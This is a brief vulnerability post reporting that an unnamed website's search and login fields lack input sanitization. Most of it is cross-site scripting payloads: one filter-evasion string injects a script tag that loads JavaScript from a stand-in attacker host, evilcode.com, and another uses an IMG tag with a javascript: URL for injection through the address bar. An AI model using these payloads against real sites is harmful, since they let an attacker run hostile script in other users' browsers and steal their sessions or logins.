Exploits & Vulns:

XSS Vulnerabilities:

The search and login  box does not sanatize user input before generating it dynamically. This could cause XSS.

For proof of concept just try putting this in the search box:
'';!--"<XSS>=&{()}'';!--"<XSS>=&{()}<SCRIPT SRC=http://www.evilcode.com/xss.js></SCRIPT>'';!--"<XSS>=&{()}'';!--"

<XSS>=&{()}

More XSS Vulns:
For the XSS examples we'll use url injection with the tag: <IMG%20SRC=javascript:alert('XSS')>
